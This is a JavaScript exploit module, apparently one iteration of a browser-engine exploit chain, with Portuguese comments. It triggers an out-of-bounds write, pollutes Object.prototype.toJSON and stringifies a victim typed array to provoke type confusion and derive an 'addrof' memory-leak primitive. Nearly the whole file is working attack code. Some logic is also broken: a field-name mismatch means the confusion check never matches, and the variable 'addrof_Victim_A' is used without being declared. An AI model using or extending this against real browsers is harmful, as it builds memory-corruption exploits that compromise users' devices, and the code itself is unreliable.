// js/script3/testArrayBufferVictimCrash.mjs (v34_RestoreMultiCallAndTargetThis)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT = "OriginalHeisenbug_TypedArrayAddrof_v34_RestoreMultiCallTargetThis";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v34 = null;
let object_to_leak_B_v34 = null;
let victim_typed_array_ref_v34 = null; 
let probe_call_count_v34 = 0;
let all_probe_interaction_details_v34 = []; 
const PROBE_CALL_LIMIT_V34 = 5; 


function toJSON_TA_Probe_RestoreMultiCall() {
    probe_call_count_v34++;
    const call_num = probe_call_count_v34;
    // current_call_details é local e descreve ESTA chamada. Se 'this' for ele mesmo (confuso), ele será modificado.
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v34_RestoreMultiCall",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v34),
        this_is_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_v34') && this.marker_v34 === (call_num - 1)),
        leaked_A_payload_set_on_this: false, 
        leaked_B_payload_set_on_this: false,
        final_keys_of_this: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsPrevMarker? ${current_call_details.this_is_prev_marker}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V34) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v34.push(current_call_details); // Adiciona esta chamada final de "parada"
            return { recursion_stopped_v34: true, call: call_num };
        }

        if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.this_is_victim}, IsPrevMarker? ${current_call_details.this_is_prev_marker})`, "vuln");
            
            // 'this' é o current_call_details desta chamada (se ele se tornou o this confuso)
            // ou um objeto marcador da chamada anterior, ou um objeto genérico.
            // Escrevemos nele.
            if (object_to_leak_A_v34) {
                this.leaky_A_payload_v34 = object_to_leak_A_v34; 
                current_call_details.leaked_A_payload_set_on_this = true;
            }
            if (object_to_leak_B_v34) {
                this.leaky_B_payload_v34 = object_to_leak_B_v34;
                current_call_details.leaked_B_payload_set_on_this = true;
            }
            try { current_call_details.final_keys_of_this = Object.keys(this); } catch(e){}
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: leaky_A/B_payload_v34 assigned to 'this'. Final 'this' keys: ${current_call_details.final_keys_of_this ? current_call_details.final_keys_of_this.join(',') : 'N/A'}`, "info");
            
            all_probe_interaction_details_v34.push(current_call_details); // Adiciona o descritor desta chamada (que é 'this')
            return this; // Retornar o 'this' confuso e modificado
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    all_probe_interaction_details_v34.push(current_call_details);
    return { marker_v34: call_num }; // Retorno padrão/para primeira chamada
}

export async function executeTypedArrayVictimAddrofTest_RestoreMultiCallAndTargetThis() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (RestoreMultiCallTargetThis) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT} Init...`;

    probe_call_count_v34 = 0;
    all_probe_interaction_details_v34 = []; 
    victim_typed_array_ref_v34 = null; 
    object_to_leak_A_v34 = { marker_A_v34: "LeakMeA_RMCT", idA: Date.now() }; 
    object_to_leak_B_v34 = { marker_B_v34: "LeakMeB_RMCT", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let details_of_last_confused_probe = null; 
    
    let addrof_A = { success: false, msg: "Addrof A from last confused probe: Default" };
    let addrof_B = { success: false, msg: "Addrof B from last confused probe: Default" };
    const fillPattern = 0.34343434343434;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v34 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v34.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v34 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_RestoreMultiCall, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v34); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // Encontrar o ÚLTIMO objeto de detalhes onde a type confusion ocorreu E as escritas foram feitas.
            for (let i = all_probe_interaction_details_v34.length - 1; i >= 0; i--) {
                const details = all_probe_interaction_details_v34[i];
                if (details.this_type === "[object Object]" && details.leaky_A_payload_set_on_this) { // Checa se 'this' era Obj E se tentamos escrever nele
                    details_of_last_confused_probe = JSON.parse(JSON.stringify(details)); // Deep copy
                    break;
                }
            }
            logS3(`  EXECUTE: Captured details of LAST CONFUSED probe run: ${details_of_last_confused_probe ? JSON.stringify(details_of_last_confused_probe) : 'N/A (No suitable confused probe call found)'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmedAndWrittenTo = false;
            if (details_of_last_confused_probe && 
                details_of_last_confused_probe.this_type === "[object Object]" &&
                details_of_last_confused_probe.leaky_A_payload_set_on_this) {
                heisenbugConfirmedAndWrittenTo = true;
                logS3(`  EXECUTE: HEISENBUG & WRITES CONFIRMED by details_of_last_confused_probe! 'this' type: ${details_of_last_confused_probe.this_type}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Details from that call (#${details_of_last_confused_probe.call_number}): IsVictim? ${details_of_last_confused_probe.this_is_victim}, IsPrevMarker? ${details_of_last_confused_probe.this_is_prev_marker}`, "info");
                logS3(`    Value of leaky_A_payload_v34 in captured details: ${details_of_last_confused_probe.leaky_A_payload_v34 ? JSON.stringify(details_of_last_confused_probe.leaky_A_payload_v34) : 'undefined/null'}`, "leak");
                logS3(`    Value of leaky_B_payload_v34 in captured details: ${details_of_last_confused_probe.leaky_B_payload_v34 ? JSON.stringify(details_of_last_confused_probe.leaky_B_payload_v34) : 'undefined/null'}`, "leak");
                logS3(`    Final keys of that confused 'this': ${details_of_last_confused_probe.final_keys_of_this ? details_of_last_confused_probe.final_keys_of_this.join(',') : 'N/A'}`, "leak");


                // VERIFICAR SE OS VALORES SÃO NÚMEROS QUE PARECEM PONTEIROS
                // details_of_last_confused_probe É o objeto 'current_call_details' da sonda, que se tornou o 'this' confuso.
                // Suas propriedades leaky_A_payload_v34 e leaky_B_payload_v34 contêm os objetos de leak.
                const val_A_obj = details_of_last_confused_probe.leaky_A_payload_v34;
                if (typeof val_A_obj === 'number' && val_A_obj !== 0) {
                    let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A_obj]).buffer)[0], new Uint32Array(new Float64Array([val_A_obj]).buffer)[1]);
                    if (num_int64.high() < 0x00020000 || (num_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                        addrof_A.success = true; addrof_A.msg = `Possible pointer from details.leaky_A_payload_v34: ${num_int64.toString(true)}`;
                    } else { addrof_A.msg = `details.leaky_A_payload_v34 is num but not ptr: ${val_A_obj}`; }
                } else if (val_A_obj && val_A_obj.marker_A_v34 === object_to_leak_A_v34.marker_A_v34) { 
                     addrof_A.msg = "details.leaky_A_payload_v34 is IDENTICAL to object_to_leak_A_v34 (object ref).";
                } else { addrof_A.msg = `details.leaky_A_payload_v34 not num or not ptr. Val: ${JSON.stringify(val_A_obj)}`; }

                const val_B_obj = details_of_last_confused_probe.leaky_B_payload_v34;
                if (typeof val_B_obj === 'number' && val_B_obj !== 0) {
                     let num_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B_obj]).buffer)[0], new Uint32Array(new Float64Array([val_B_obj]).buffer)[1]);
                    if (num_int64.high() < 0x00020000 || (num_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                        addrof_B.success = true; addrof_B.msg = `Possible pointer from details.leaky_B_payload_v34: ${num_int64.toString(true)}`;
                    } else { addrof_B.msg = `details.leaky_B_payload_v34 is num but not ptr: ${val_B_obj}`; }
                } else if (val_B_obj && val_B_obj.marker_B_v34 === object_to_leak_B_v34.marker_B_v34) {
                     addrof_B.msg = "details.leaky_B_payload_v34 is IDENTICAL to object_to_leak_B_v34 (object ref).";
                } else { addrof_B.msg = `details.leaky_B_payload_v34 not num or not ptr. Val: ${JSON.stringify(val_B_obj)}`; }

            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug & Writes NOT confirmed by details_of_last_confused_probe. Last 'this' type: ${details_of_last_confused_probe ? details_of_last_confused_probe.this_type : 'N/A (no suitable probe call found)'}`, "error", FNAME_CURRENT_TEST);
            }
                
            // Checar buffer da vítima (não esperamos que mude)
            if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;


            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT}: AddrFromDetails SUCCESS!`;
            } else if (heisenbugConfirmedAndWrittenTo) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v34}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A from details: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B from details: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Victim Buffer A check: ${addrof_Victim_A.msg}`, "info", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v34 = null; 
        all_probe_interaction_details_v34 = []; 
        probe_call_count_v34 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: details_of_last_confused_probe, 
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v34],
        total_probe_calls: probe_call_count_v34,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
